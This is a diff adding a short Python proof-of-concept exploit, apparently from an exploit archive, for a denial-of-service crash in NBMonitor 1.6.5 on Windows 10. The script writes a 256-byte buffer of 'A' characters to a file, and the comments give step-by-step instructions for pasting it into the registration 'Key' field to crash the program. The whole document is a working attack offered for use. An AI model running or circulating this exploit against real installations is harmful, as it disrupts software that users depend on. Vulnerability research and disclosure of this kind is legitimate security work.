@@ -1,0 +1,23 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: NBMonitor 1.6.5 - 'Key' Denial of Service (PoC)
+# Date: 15/02/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.nsauditor.com/
+# Software Link: http://www.nbmonitor.com/downloads/nbmonitor_setup.exe
+# Version: 1.6.5.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "NBMonitor.py", it will create a new file "PoC.txt"
+# 2.- Copy the text from the generated PoC.txt file to clipboard
+# 3.- Open NBMonitor.exe 
+# 4.- Go to Register > Enter Registration Code...
+# 5.- Write anything in 'Name' field
+# 6.- Paste clipboard in 'Key' field
+# 7.- Click on button -> Ok
+# 8.- Crashed
+
+buffer = "\x41" * 256
+f = open ("PoC.txt", "w")
+f.write(buffer)
+f.close()
